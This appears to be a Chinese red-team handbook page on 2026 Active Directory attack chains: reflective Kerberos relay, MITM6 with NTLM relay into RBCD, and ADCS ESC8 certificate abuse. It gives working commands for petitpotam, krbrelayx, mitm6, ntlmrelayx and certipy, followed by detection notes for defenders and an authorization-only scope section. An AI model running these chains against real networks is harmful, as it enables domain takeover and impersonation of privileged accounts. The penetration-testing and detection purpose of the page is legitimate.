# 内网 2026 新攻击链（Kerberos 反射 / MITM6+RBCD / ADCS）

> 深化 `内网域渗透手册.md` 的 2026 新面：这些链把"普通用户/内网入口"打到域控。全部授权演练环境手法；SRC 不打内网。

## 一、反射式 Kerberos 中继攻击（2025.6 公开）

**背景**：NTLM 在 MS08-068（2008）后有了反射中继保护，但 **Kerberos 没有**。攻击者诱导目标计算机向攻击者控制的系统做 Kerberos 认证，拿到**该计算机自身的服务票据**，中继回目标以该计算机账户身份认证成功。

```
1. 诱导目标机向攻击者 SMB 服务做 Kerberos 认证
2. 捕获该计算机自身的服务票据
3. 票据中继回目标机 → 以计算机账户身份认证成功
4. 计算机账户权限 → 横向
```

```bash
# 强制认证（PetitPotam 系，触发目标向攻击者认证）
python3 petitpotam.py -u user -p pass <attacker_ip> <target_ip>
# 中继捕获的 Kerberos 票据
krbrelayx -es <target_SPN> -s <session_key>
```

**检测思路**：异常 Kerberos 认证流向（一是 SMB 服务认证源非预期）、PetitPotam 类触发调用。

## 二、MITM6 + NTLM 中继 → RBCD → 域控接管（IPv6 向量）

**原理**：Windows IPv6 优先于 IPv4 且 AD DNS 默认不配 IPv6 → 攻击者 `mitm6` 欺骗 DNS + WPAD 欺骗 → 捕获的 NTLM 中继到 LDAP/ADCS → 任意已认证用户可加计算机账户 → **RBCD（基于资源的约束委派）** 冒充特权账户 → 域控接管。

```bash
# 1. IPv6 DNS 欺骗
mitm6 -d target.local
# 2. NTLM 中继到 LDAP（WPAD 触发认证）
ntlmrelayx -t ldap://dc.target.local -wh attacker-wpad.target.local --delegate-access
# 3. 受害者访问网页 → WPAD → 认证被中继 → RBCD 委派
# 4. 使用委派票据冒充目标 → DC 控制
```

**前置条件**：域内网络可达 + DHCPv6/DNS 可欺骗（演练环境）；AD 未启用 IPv6 DNS 配置。

## 三、ESC8 — NTLM 中继到 ADCS Web 注册

```bash
# 枚举 ADCS 是否启用 Web 注册（certsrv）
nxc ldap <DC> -u user -p pass -M enum_adcs
# 若启用 → NTLM 中继到 certsrv 注册端点 → 证书 → 冒充任意用户
ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template=User
```

**ESC1-8 全谱**（AD CS 证书攻击）：ESC1（模板可编辑+client auth）、ESC3（代理注册）、ESC6（EDITF_ATTRIBUTESUBJECTALTNAME2）、ESC8（NTLM 中继 Web 注册）——配合 `certipy` 自动化。

```bash
certipy find -u <EMAIL-REDACTED> -p pass -dc-ip <DC> -vulnerable
certipy req -u <EMAIL-REDACTED> -p pass -ca '<CA>' -target <CA_HOST> -template User -upn <EMAIL-REDACTED>
```

## 四、IPv6 / 零信任绕过面（2026）

| 面 | 手法 |
|----|------|
| IPv6 无监控 | 内网 IPv6 网段通常无 IDS/防火墙规则 → `ping6 ff02::1` 发现、扫 IPv6 资产（nmap -6） |
| SLAAC 重定向 | 路由器广播伪造 RA → 中间人 IPv6 流量 |
| NDP 欺骗 | 邻居发现协议欺骗（类 ARP，IPv6 版） |
| 零信任/NAC 绕过 | 访客网段到受保护段的路由缺口、802.1X 客户端自主注册面 |
| IMDSv2 绕过 | 云内横向（Axios 类 CVE-2026 系）→ SSRF 带 PUT+头的能力评估（见 ssrf深化手册） |

## 六、检测（写报告给蓝队）

- **Kerberos 中继**：4768/4769 Kerberos 认证来源异常（SMB 服务认证源非预期）、PetitPotam 类触发调用（无效路径错误激增）
- **MITM6**：DHCPv6 应答异常多、WPAD 查询指向非预期、IPv6 流量突增
- **ADCS**：证书注册请求异动（4662/证书服务日志）、`certsrv` 端点 NTLM 中继特征
- **通用**：新计算机账户创建（4720）、RBCD msDS-AllowedToActOnBehalfOfOtherIdentity 属性变化（5136）→ EDR 规则可落地

## 七、红线
- 这些链全部是**域控级接管**——只在演练/授权 AD 环境验证；验证到"路径可达"即止，不做真实冒充/实际处分
- 与 SRC 无关（SRC 不打内网）；红队演练时必须单独书面授权内网范围
- 工具使用保持环境最小影响（mitm6/中继会造成网络干扰——演练前说明）
